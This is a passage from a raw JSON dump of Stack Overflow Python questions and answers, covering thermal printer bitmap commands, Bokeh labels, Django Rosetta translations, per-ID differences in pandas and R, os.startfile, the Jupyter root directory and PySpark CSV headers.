and how do I code that in the string???  Does x=width and y=height?... then how do I get an image width of the maximum 384 dots?</p>\n\n<p>Does this mean that I have to enter \"\\x00\" or \"\\x01\" for each dot, so one instance (a small black block of 8x8) of GS* would be 64*\"\\x01\"?</p>\n\n<p>Do I have to GS * each group of 8 dots tall or line of 8 dots, or will that overwrite the previously programmed data?</p>\n\n<p>I'd like to later include in my program a means of easily creating logos using a tkinter canvas widget and saving it to a text file for future printing using pI(), so I really need to know how to directly 'download' image data to the printer and using a third party module probably won't work since I want to continue using my pI() function.  Yes, it's ambitious and I'm probably doing it the hard way.  But I'm afraid if I start incorporating too much new stuff I'm not familiar with, I'll get too confused.</p>\n\n<p>Basically, what string should I send to pI() to download an image of a solid 8x8-dot black box with a 2x wide white line down the center on the printer?</p>\n\n<p><a href=\"http://i.stack.imgur.com/E7gVa.jpg\" rel=\"nofollow\">Here's an example of what I would like the printer to print so I can see a working code string</a></p>\n"}, {"tags": ["python", "bokeh"], "comments": [{"owner": {"reputation": 29976, "user_id": 3406693, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gwfWQ.png?s=128&g=1", "display_name": "bigreddot", "link": "https://stackoverflow.com/users/3406693/bigreddot"}, "edited": false, "score": 0, "creation_date": 1463000612, "post_id": 37173146, "comment_id": 61881066, "body": "Label annotations are coming in <code>0.12</code>, for now you could use <code>Figure.text</code> glyph method."}, {"owner": {"reputation": 31, "user_id": 6316811, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f2a3b09110ab39689589f9973796b0d?s=128&d=identicon&r=PG&f=1", "display_name": "DBids", "link": "https://stackoverflow.com/users/6316811/dbids"}, "reply_to_user": {"reputation": 29976, "user_id": 3406693, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gwfWQ.png?s=128&g=1", "display_name": "bigreddot", "link": "https://stackoverflow.com/users/3406693/bigreddot"}, "edited": false, "score": 0, "creation_date": 1468332649, "post_id": 37173146, "comment_id": 64077127, "body": "@bigreddot Would you revisit this question in the context of 0.12"}], "owner": {"reputation": 31, "user_id": 6316811, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f2a3b09110ab39689589f9973796b0d?s=128&d=identicon&r=PG&f=1", "display_name": "DBids", "link": "https://stackoverflow.com/users/6316811/dbids"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 488, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1463000234, "creation_date": 1463000234, "question_id": 37173146, "link": "https://stackoverflow.com/questions/37173146/adding-a-label-to-bokeh-span", "title": "Adding a Label to Bokeh Span", "body": "<p>I want to label my Span annotations in Bokeh just as is done in the plot below. (Sorry for the link, my reputation won't allow me to post as an image)\n <a href=\"https://www.google.com/url?sa=i&amp;rct=j&amp;q=&amp;esrc=s&amp;source=images&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwj-vOX589LMAhWh8YMKHYe0CsIQjRwIBw&amp;url=http%3A%2F%2Fmathematica.stackexchange.com%2Fquestions%2F80467%2Fadding-annotations-to-plot-with-vertical-leader-line-to-the-curve&amp;psig=AFQjCNE_kMOcJTDxiDbCPdZY2T2-Rk44Vw&amp;ust=1463086437547238\" rel=\"nofollow\">https://www.google.com/url?sa=i&amp;rct=j&amp;q=&amp;esrc=s&amp;source=images&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwj-vOX589LMAhWh8YMKHYe0CsIQjRwIBw&amp;url=http%3A%2F%2Fmathematica.stackexchange.com%2Fquestions%2F80467%2Fadding-annotations-to-plot-with-vertical-leader-line-to-the-curve&amp;psig=AFQjCNE_kMOcJTDxiDbCPdZY2T2-Rk44Vw&amp;ust=1463086437547238</a></p>\n"}, {"tags": ["python", "django", "translation", "django-rosetta"], "answers": [{"comments": [{"owner": {"reputation": 841, "user_id": 2671448, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d88f45c84f42d9ef5a408072cab95c50?s=128&d=identicon&r=PG&f=1", "display_name": "bre", "link": "https://stackoverflow.com/users/2671448/bre"}, "edited": false, "score": 0, "creation_date": 1467845548, "post_id": 37191228, "comment_id": 63891678, "body": "could you please paste somewhere your translation? I&#39;m working on an italian one but getting errors with forms plurals."}, {"owner": {"reputation": 23, "user_id": 2752015, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2f13ab8839e2424ba59a390a4f45d2e?s=128&d=identicon&r=PG&f=1", "display_name": "lucaschain", "link": "https://stackoverflow.com/users/2752015/lucaschain"}, "reply_to_user": {"reputation": 841, "user_id": 2671448, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d88f45c84f42d9ef5a408072cab95c50?s=128&d=identicon&r=PG&f=1", "display_name": "bre", "link": "https://stackoverflow.com/users/2671448/bre"}, "edited": false, "score": 0, "creation_date": 1468014475, "post_id": 37191228, "comment_id": 63970962, "body": "Sure, I just added a pastebin URL with my .po file inside the question body, you can take a look at it."}], "tags": [], "owner": {"reputation": 23, "user_id": 2752015, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2f13ab8839e2424ba59a390a4f45d2e?s=128&d=identicon&r=PG&f=1", "display_name": "lucaschain", "link": "https://stackoverflow.com/users/2752015/lucaschain"}, "is_accepted": true, "score": 1, "last_activity_date": 1463066490, "creation_date": 1463066490, "answer_id": 37191228, "question_id": 37173122, "link": "https://stackoverflow.com/questions/37173122/django-translation-using-rosetta-not-reflecting-changes/37191228#37191228", "title": "Django translation using rosetta not reflecting changes", "body": "<p>My problem was:</p>\n\n<p>My django.po file was not filled with the correct language code:</p>\n\n<pre><code>\"Language: \\n\"\n</code></pre>\n\n<p>so I changed to </p>\n\n<pre><code>\"Language: pt_BR\\n\"\n</code></pre>\n\n<p>after re-compiling messages (<code>python manage.py compilemessages</code>) everything worked nicely.</p>\n\n<p>Also, I found out the LOCALE_PATHS setting needed a slash after the path like this:</p>\n\n<pre><code>LOCALE_PATHS = ( \n    os.path.join(PROJECT_ROOT, \"locale/\"),\n)\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 2752015, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2f13ab8839e2424ba59a390a4f45d2e?s=128&d=identicon&r=PG&f=1", "display_name": "lucaschain", "link": "https://stackoverflow.com/users/2752015/lucaschain"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 576, "favorite_count": 2, "accepted_answer_id": 37191228, "answer_count": 1, "score": 0, "last_activity_date": 1580337818, "creation_date": 1463000145, "last_edit_date": 1580337818, "question_id": 37173122, "link": "https://stackoverflow.com/questions/37173122/django-translation-using-rosetta-not-reflecting-changes", "title": "Django translation using rosetta not reflecting changes", "body": "<p>I currently have a small problem using saleor:</p>\n\n<p>First, I set the following configuration in saleor/settings.py:</p>\n\n<pre><code># other settings config\nLANGUAGE_CODE = 'pt_BR'\nPROJECT_ROOT = os.path.normpath(os.path.join(os.path.dirname(__file__), '..'))\nLOCALE_PATHS = ( \n    os.path.join(PROJECT_ROOT, \"locale\"),\n)\nUSE_I18N = True\nUSE_L10N = True\nUSE_TZ = True\n</code></pre>\n\n<p>Then I created the directory tree <code>/locale/pt_BR/LC_MESSAGES</code> at the project's root.</p>\n\n<p>After that, I opened up rosetta and started translating everything to my language code (pt_BR). Everything worked as expected, but I can't see the changes I made on the website.</p>\n\n<p>I already tried:</p>\n\n<ul>\n<li>restarting the server (<code>python manage.py runserver</code>)</li>\n<li>manually running <code>python manage.py compilemessages</code> with no errors on my edited .po file.</li>\n</ul>\n\n<p>It generates the .po and .mo files inside the expected folder, but nothing seems to change (everything is still in english)</p>\n\n<p>Additional info:\nDjango version 1.9.3\nPython version 2.7</p>\n\n<p>Does anybody have the same problem?\nThank you</p>\n\n<p>----- Edit -----</p>\n\n<p>This is my final (with the problem solved) .po file:</p>\n\n<p><a href=\"http://pastebin.com/EwrMYYyA\" rel=\"nofollow\">http://pastebin.com/EwrMYYyA</a></p>\n"}, {"tags": ["python", "r", "pandas"], "comments": [{"owner": {"reputation": 10100, "user_id": 590028, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/43c6ce77252e438b40b96f5c68cf3432?s=128&d=identicon&r=PG", "display_name": "user590028", "link": "https://stackoverflow.com/users/590028/user590028"}, "edited": false, "score": 0, "creation_date": 1463000173, "post_id": 37173088, "comment_id": 61880850, "body": "Show us what you&#39;ve tried."}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463000897, "post_id": 37173088, "comment_id": 61881227, "body": "If the scores really look like this then you certainly can just iterate over them, just add an if statement to check if the previous ID is the same."}], "answers": [{"comments": [{"owner": {"reputation": 681, "user_id": 5667298, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/697b66ad849e59a8ac5751484f77bee8?s=128&d=identicon&r=PG&f=1", "display_name": "Tom", "link": "https://stackoverflow.com/users/5667298/tom"}, "edited": false, "score": 0, "creation_date": 1463000334, "post_id": 37173129, "comment_id": 61880926, "body": "Wow, that&#39;s very neat. I didn&#39;t know there was a specific command df to do that in python"}], "tags": [], "owner": {"reputation": 86481, "user_id": 2411802, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/RA92x.jpg?s=128&g=1", "display_name": "Alexander", "link": "https://stackoverflow.com/users/2411802/alexander"}, "is_accepted": true, "score": 3, "last_activity_date": 1463000432, "last_edit_date": 1463000432, "creation_date": 1463000177, "answer_id": 37173129, "question_id": 37173088, "link": "https://stackoverflow.com/questions/37173088/how-can-i-calculate-values-specific-to-an-id-provided-on-each-line/37173129#37173129", "title": "How can I calculate values specific to an ID provided on each line?", "body": "<p>In Python using Pandas:</p>\n\n<pre><code>import pandas as pd\n\ndf = pd.DataFrame(\n        {'ID': [1, 1, 1, 1, 2, 2, 2, 3, 3, 3, 3, 3],\n         'Score': [1.2, 2.4, 1.1, 1.9, 2.4, 3.5, 2.2, 1.1, 1.1, 1.7, 3.1, 2.2]})\n\ndf['Changes'] = df.groupby('ID').Score.transform(lambda group: group.diff())\n\n&gt;&gt;&gt; df\n    Score  ID  Changes\n0     1.2   1      NaN\n1     2.4   1      1.2\n2     1.1   1     -1.3\n3     1.9   1      0.8\n4     2.4   2      NaN\n5     3.5   2      1.1\n6     2.2   2     -1.3\n7     1.1   3      NaN\n8     1.1   3      0.0\n9     1.7   3      0.6\n10    3.1   3      1.4\n11    2.2   3     -0.9\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 681, "user_id": 5667298, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/697b66ad849e59a8ac5751484f77bee8?s=128&d=identicon&r=PG&f=1", "display_name": "Tom", "link": "https://stackoverflow.com/users/5667298/tom"}, "edited": false, "score": 0, "creation_date": 1463000880, "post_id": 37173142, "comment_id": 61881213, "body": "I&#39;m not sure I understand what&#39;s going on in that Changes line. Can you explain it? How does it know to group by ID? Where does that x come from?"}, {"owner": {"reputation": 48227, "user_id": 1327739, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b4d8209bc0fd155f340561cbf5bb9158?s=128&d=identicon&r=PG", "display_name": "lukeA", "link": "https://stackoverflow.com/users/1327739/lukea"}, "reply_to_user": {"reputation": 681, "user_id": 5667298, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/697b66ad849e59a8ac5751484f77bee8?s=128&d=identicon&r=PG&f=1", "display_name": "Tom", "link": "https://stackoverflow.com/users/5667298/tom"}, "edited": false, "score": 0, "creation_date": 1463001163, "post_id": 37173142, "comment_id": 61881365, "body": "Have a look at <a href=\"http://www.inside-r.org/r-doc/stats/ave\" rel=\"nofollow noreferrer\"><code>?ave</code></a>: arguments after the 1st argument may be grouping variables, which is <code>df$ID</code> here. The <code>x</code> comes from the <code>function</code> call. <code>ave</code> basically splits the data by <code>ID</code>, passes <code>Score</code> as <code>x</code> to the function, which then calculates the consecutive differences and adds <code>NA</code>, because there is no difference for the 1st value.  It could have also been <code>df$Changes &lt;- ave(df$Score, df$ID, FUN = function(x) c(NA, diff(x)))</code>."}, {"owner": {"reputation": 6484, "user_id": 599911, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/77e675a98e6c0da7ece42fe56918f921?s=128&d=identicon&r=PG", "display_name": "Bulat", "link": "https://stackoverflow.com/users/599911/bulat"}, "edited": false, "score": 0, "creation_date": 1463005575, "post_id": 37173142, "comment_id": 61883241, "body": "this seems to be very slow, considering together with the complexity of the syntax I would not do it this way."}, {"owner": {"reputation": 48227, "user_id": 1327739, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b4d8209bc0fd155f340561cbf5bb9158?s=128&d=identicon&r=PG", "display_name": "lukeA", "link": "https://stackoverflow.com/users/1327739/lukea"}, "reply_to_user": {"reputation": 6484, "user_id": 599911, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/77e675a98e6c0da7ece42fe56918f921?s=128&d=identicon&r=PG", "display_name": "Bulat", "link": "https://stackoverflow.com/users/599911/bulat"}, "edited": false, "score": 0, "creation_date": 1463006319, "post_id": 37173142, "comment_id": 61883496, "body": "@Bulat <code>ave</code> is acually pretty fast - see my edit. And it does not need another package and data structure."}, {"owner": {"reputation": 6484, "user_id": 599911, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/77e675a98e6c0da7ece42fe56918f921?s=128&d=identicon&r=PG", "display_name": "Bulat", "link": "https://stackoverflow.com/users/599911/bulat"}, "edited": false, "score": 0, "creation_date": 1463010119, "post_id": 37173142, "comment_id": 61884586, "body": "did you just test it on 10 records?"}], "tags": [], "owner": {"reputation": 48227, "user_id": 1327739, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b4d8209bc0fd155f340561cbf5bb9158?s=128&d=identicon&r=PG", "display_name": "lukeA", "link": "https://stackoverflow.com/users/1327739/lukea"}, "is_accepted": false, "score": 5, "last_activity_date": 1463006301, "last_edit_date": 1463006301, "creation_date": 1463000214, "answer_id": 37173142, "question_id": 37173088, "link": "https://stackoverflow.com/questions/37173088/how-can-i-calculate-values-specific-to-an-id-provided-on-each-line/37173142#37173142", "title": "How can I calculate values specific to an ID provided on each line?", "body": "<p>In R maybe: </p>\n\n<pre><code>transform(\n  df, \n  Changes = ave(df$Score, df$ID, FUN = function(x) c(NA, diff(x)))\n)\n#    Score ID Changes\n# 1    1.2  1      NA\n# 2    2.4  1     1.2\n# 3    1.1  1    -1.3\n# 4    1.9  1     0.8\n# 5    2.4  2      NA\n# 6    3.5  2     1.1\n# 7    2.2  2    -1.3\n# 8    1.1  3      NA\n# 9    1.1  3     0.0\n# 10   1.7  3     0.6\n# 11   3.1  3     1.4\n# 12   2.2  3    -0.9\n</code></pre>\n\n<p><code>df</code> holds your original data frame. </p>\n\n<hr>\n\n<p>With regards to @Bulat's comment:</p>\n\n<pre><code>id&lt;- c(1, 1, 1, 1, 2, 2, 2, 3, 3, 3, 3, 3)\nscore &lt;-  c(1.2, 2.4, 1.1, 1.9, 2.4, 3.5, 2.2, 1.1, 1.1, 1.7, 3.1, 2.2)\nlibrary(data.table)\ndf &lt;- data.frame(id, score)\ndt = data.table(id, score)\nlibrary(microbenchmark)\nmicrobenchmark(\n  dt = dt[ , diff := c(NA, diff(score)), by = id],\n  df = df$diff &lt;- ave(df$score, df$id, FUN = function(x) c(NA, diff(x))),\n  times = 1000\n)\n# Unit: microseconds\n#  expr      min        lq      mean    median        uq      max neval cld\n#    dt 1121.931 1225.2660 1342.4626 1269.5530 1321.2210 5908.411  1000   b\n#    df  397.175  488.2085  547.8198  525.8175  586.7995 7784.270  1000  a \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 6484, "user_id": 599911, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/77e675a98e6c0da7ece42fe56918f921?s=128&d=identicon&r=PG", "display_name": "Bulat", "link": "https://stackoverflow.com/users/599911/bulat"}, "is_accepted": false, "score": 2, "last_activity_date": 1463005547, "last_edit_date": 1463005547, "creation_date": 1463001163, "answer_id": 37173385, "question_id": 37173088, "link": "https://stackoverflow.com/questions/37173088/how-can-i-calculate-values-specific-to-an-id-provided-on-each-line/37173385#37173385", "title": "How can I calculate values specific to an ID provided on each line?", "body": "<p>R with <code>data.table</code>:</p>\n\n<pre><code>id&lt;- c(1, 1, 1, 1, 2, 2, 2, 3, 3, 3, 3, 3)\nscore &lt;-  c(1.2, 2.4, 1.1, 1.9, 2.4, 3.5, 2.2, 1.1, 1.1, 1.7, 3.1, 2.2)\nlibrary(data.table)\ndf = data.table(id, score)\n\ndf[ , diff := c(NA, diff(score)), by = id]\n</code></pre>\n\n<p>It is worth mentioning that this is 10x faster compared to the <code>transform</code> approach:</p>\n\n<pre><code>id&lt;- c(1, 1, 1, 1, 2, 2, 2, 3, 3, 3, 3, 3)\nid &lt;- rep(id, 10^5)\nscore &lt;-  c(1.2, 2.4, 1.1, 1.9, 2.4, 3.5, 2.2, 1.1, 1.1, 1.7, 3.1, 2.2)\nscore &lt;- rep(score, 10^5)\nlibrary(data.table)\ndt = data.table(id, score)\ndf = data.frame(id, score)\n\nlibrary(microbenchmark)\nm &lt;- microbenchmark(\n  \"data.table\" = dt[ , diff := c(NA, diff(score)), by = id],\n  \"transform\" = transform(\n    df, \n    Changes = ave(df$score, df$id, FUN = function(x) c(NA, diff(x)))\n  ), times = 10\n)\n\nboxplot(m)\nprint(m)\n# Unit: milliseconds\n#      expr       min        lq      mean    median        uq       max neval\n# data.table   95.1905  100.3342  111.2434  102.6525  106.7417  151.2913    10\n#  transform 1032.3829 1066.3912 1078.5727 1070.9577 1103.4971 1135.7380    10\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 661312, "user_id": 3732271, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ee6e12042dc31b1ef27471482f9ff91f?s=128&d=identicon&r=PG&f=1", "display_name": "akrun", "link": "https://stackoverflow.com/users/3732271/akrun"}, "is_accepted": false, "score": 0, "last_activity_date": 1463016488, "creation_date": 1463016488, "answer_id": 37175781, "question_id": 37173088, "link": "https://stackoverflow.com/questions/37173088/how-can-i-calculate-values-specific-to-an-id-provided-on-each-line/37175781#37175781", "title": "How can I calculate values specific to an ID provided on each line?", "body": "<p>Using <code>dplyr</code> in <code>R</code></p>\n\n<pre><code>library(dplyr)\ndf1 %&gt;% \n   group_by(ID) %&gt;% \n   mutate(diff = c(NA, diff(Score)))\n#   Score    ID  diff\n#   &lt;dbl&gt; &lt;int&gt; &lt;dbl&gt;\n#1    1.2     1    NA\n#2    2.4     1   1.2\n#3    1.1     1  -1.3\n#4    1.9     1   0.8\n#5    2.4     2    NA\n#6    3.5     2   1.1\n#7    2.2     2  -1.3\n#8    1.1     3    NA\n#9    1.1     3   0.0\n#10   1.7     3   0.6\n#11   3.1     3   1.4\n#12   2.2     3  -0.9\n</code></pre>\n"}], "owner": {"reputation": 681, "user_id": 5667298, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/697b66ad849e59a8ac5751484f77bee8?s=128&d=identicon&r=PG&f=1", "display_name": "Tom", "link": "https://stackoverflow.com/users/5667298/tom"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "accepted_answer_id": 37173129, "answer_count": 4, "score": 0, "last_activity_date": 1463016488, "creation_date": 1463000022, "last_edit_date": 1463008109, "question_id": 37173088, "link": "https://stackoverflow.com/questions/37173088/how-can-i-calculate-values-specific-to-an-id-provided-on-each-line", "title": "How can I calculate values specific to an ID provided on each line?", "body": "<p>I have a data table of values that look like this:</p>\n\n<pre><code>Score ID\n1.2    1\n2.4    1\n1.1    1\n1.9    1\n2.4    2\n3.5    2\n2.2    2\n1.1    3\n1.1    3\n1.7    3\n3.1    3\n2.2    3\n</code></pre>\n\n<p>And what I really need is to calculate the Change In Score for each ID in a separate column, such that it looks like this:</p>\n\n<pre><code>Score   ID  Changes\n1.2     1   \n2.4     1   1.2\n1.1     1   -1.3\n1.9     1   0.8\n2.4     2   \n3.5     2   1.1\n2.2     2   -1.3\n1.1     3   \n1.1     3   0\n1.7     3   0.6\n3.1     3   1.4\n2.2     3   -0.9\n</code></pre>\n\n<p>Notice how each \"changes\" is calculated by taking the previous score, and subtracting it from the current score: e.g. in the first changes, you get 1.2 by taking  1.2 = 2.4(current score) - 1.2(The previous score)</p>\n\n<p>The problem is that these scores must only pertain to only the scores within the confines of the ID. You can't just iterate over and take the difference of scores. How would I do this? What logic can I use to test to contain \"changes\" within the same ID? I'm familiar with R or python (or BASH) to do this.</p>\n"}, {"tags": ["python", "display"], "answers": [{"comments": [{"owner": {"reputation": 2545, "user_id": 2962364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/18f0160627ff4551f2af40e93e17dfa1?s=128&d=identicon&r=PG&f=1", "display_name": "Roberto", "link": "https://stackoverflow.com/users/2962364/roberto"}, "edited": false, "score": 0, "creation_date": 1463000003, "post_id": 37173043, "comment_id": 61880767, "body": "Well, this means that your script will cease to interact with the application as soon as the file is launched, not that the application can&#39;t be killed from within Python."}, {"owner": {"reputation": 10100, "user_id": 590028, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/43c6ce77252e438b40b96f5c68cf3432?s=128&d=identicon&r=PG", "display_name": "user590028", "link": "https://stackoverflow.com/users/590028/user590028"}, "reply_to_user": {"reputation": 2545, "user_id": 2962364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/18f0160627ff4551f2af40e93e17dfa1?s=128&d=identicon&r=PG&f=1", "display_name": "Roberto", "link": "https://stackoverflow.com/users/2962364/roberto"}, "edited": false, "score": 0, "creation_date": 1463000083, "post_id": 37173043, "comment_id": 61880814, "body": "Agreed -- that&#39;s why I referred him to pywin"}], "tags": [], "owner": {"reputation": 10100, "user_id": 590028, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/43c6ce77252e438b40b96f5c68cf3432?s=128&d=identicon&r=PG", "display_name": "user590028", "link": "https://stackoverflow.com/users/590028/user590028"}, "is_accepted": true, "score": 4, "last_activity_date": 1462999815, "creation_date": 1462999815, "answer_id": 37173043, "question_id": 37173004, "link": "https://stackoverflow.com/questions/37173004/how-to-close-the-display-of-the-file/37173043#37173043", "title": "How to close the display of the file", "body": "<p>According to the docs, there is no way -- <a href=\"https://docs.python.org/2.7/library/os.html#os.startfile\">https://docs.python.org/2.7/library/os.html#os.startfile</a></p>\n\n<blockquote>\n  <p>startfile() returns as soon as the associated application is launched.\n  There is no option to wait for the application to close, and no way to\n  retrieve the application\u2019s exit status.</p>\n</blockquote>\n\n<p>You will need to revert to pywin.</p>\n"}], "owner": {"reputation": 29, "user_id": 6168283, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/41d5a47c5fdcfc941ef44cd729a50f6c?s=128&d=identicon&r=PG&f=1", "display_name": "Aditya", "link": "https://stackoverflow.com/users/6168283/aditya"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 0, "accepted_answer_id": 37173043, "answer_count": 1, "score": 0, "last_activity_date": 1463000416, "creation_date": 1462999654, "last_edit_date": 1463000416, "question_id": 37173004, "link": "https://stackoverflow.com/questions/37173004/how-to-close-the-display-of-the-file", "title": "How to close the display of the file", "body": "<p>I'm using os.startfile(filename) to open (display) a file. I'm unable to find any command to close the display of this file. </p>\n\n<p>Please, let me know, if there's any corresponding command or function for this. </p>\n"}, {"tags": ["python", "path", "tree", "ipython", "jupyter"], "answers": [{"tags": [], "owner": {"reputation": 3739, "user_id": 5422525, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/9fb3d7ac742a990084930a48b6001421?s=128&d=identicon&r=PG&f=1", "display_name": "M.T", "link": "https://stackoverflow.com/users/5422525/m-t"}, "is_accepted": true, "score": 1, "last_activity_date": 1463004575, "creation_date": 1463004575, "answer_id": 37174102, "question_id": 37172992, "link": "https://stackoverflow.com/questions/37172992/accessing-root-in-jupyter-notebook/37174102#37174102", "title": "Accessing Root in Jupyter Notebook", "body": "<p>This is a slightly hacky way, but works:</p>\n\n<pre><code>import jupyter_core\nimport os,glob,json\n\njrd = jupyter_core.paths.jupyter_runtime_dir()\nwith open(glob.glob(jrd+'/nbserver-*.json')[0]) as json_file:\n    root_dir = json.load(json_file)['notebook_dir']\n</code></pre>\n\n<p>The reason for the globbing is because the json file you are looking for has a number corresponding to the process id (PID) in its name.</p>\n\n<p>Therefore this method will be guaranteed to work if you have <strong>only one</strong> notebook instance. If you know the PID you don't need to use <code>glob</code></p>\n"}], "owner": {"reputation": 53, "user_id": 3411567, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/72c03066d9437f2d16700758139db682?s=128&d=identicon&r=PG&f=1", "display_name": "Brice Nichols", "link": "https://stackoverflow.com/users/3411567/brice-nichols"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 739, "favorite_count": 0, "accepted_answer_id": 37174102, "answer_count": 1, "score": 1, "last_activity_date": 1463004575, "creation_date": 1462999625, "question_id": 37172992, "link": "https://stackoverflow.com/questions/37172992/accessing-root-in-jupyter-notebook", "title": "Accessing Root in Jupyter Notebook", "body": "<p>I've started a notebook from the D:/ drive, but navigated a few directories down. My notebook is at D:/dir1/dir2/notebook.ipynb. In my current notebook, I want to execute a script in the root of D:/, where my notebook session was started from.</p>\n\n<p>I want to avoid relative path changes, and was hoping there's a way to access the directory location of where I had started the notebook (the location corresponding to localhost:xxxx/tree. Is that possible?</p>\n"}, {"tags": ["python", "csv", "pyspark"], "comments": [{"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 1, "creation_date": 1463001059, "post_id": 37172979, "comment_id": 61881307, "body": "Just add a <code>[0]</code> at the very end of your code. Don&#39;t worry about the <code>u</code>, it&#39;s harmless. It means it&#39;s a unicode object rather than a plain string, which is actually a good thing. If you try <code>for header in data.collect(): print header</code> you&#39;ll see just the headers :-)"}, {"owner": {"reputation": 2163, "user_id": 2966197, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/171eadb3de26f91e2db374d3620be388?s=128&d=identicon&r=PG&f=1", "display_name": "user2966197", "link": "https://stackoverflow.com/users/2966197/user2966197"}, "reply_to_user": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463002184, "post_id": 37172979, "comment_id": 61881861, "body": "@AlexHall where should I put <code>[0]</code>?"}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463002321, "post_id": 37172979, "comment_id": 61881918, "body": "What you see is a list containing one element: a list. You can extract that one element with <code>[0]</code>, i.e. <code>print data.collect()[0]</code> or <code>for header in data.collect()[0]: print header</code> (I forgot it in the above comment)."}, {"owner": {"reputation": 2163, "user_id": 2966197, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/171eadb3de26f91e2db374d3620be388?s=128&d=identicon&r=PG&f=1", "display_name": "user2966197", "link": "https://stackoverflow.com/users/2966197/user2966197"}, "reply_to_user": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463002400, "post_id": 37172979, "comment_id": 61881956, "body": "@AlexHall Also I have to do some list matching later (finding uncommon elements between this list and another list), so wouldn&#39;t this <code>u</code> create issue at that time?"}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463002587, "post_id": 37172979, "comment_id": 61882032, "body": "No, it&#39;s fine. Try entering this in a python shell: <code>u&#39;abc&#39; == &#39;abc&#39;</code>"}], "answers": [{"tags": [], "owner": {"reputation": 502, "user_id": 3298826, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d80d437d6d9e6b9bc7835a7307792c19?s=128&d=identicon&r=PG", "display_name": "H2O", "link": "https://stackoverflow.com/users/3298826/h2o"}, "is_accepted": true, "score": 1, "last_activity_date": 1469406743, "last_edit_date": 1469406743, "creation_date": 1463002404, "answer_id": 37173655, "question_id": 37172979, "link": "https://stackoverflow.com/questions/37172979/form-a-list-of-strings-from-the-header-of-a-csv-file-in-pyspark/37173655#37173655", "title": "form a list of strings 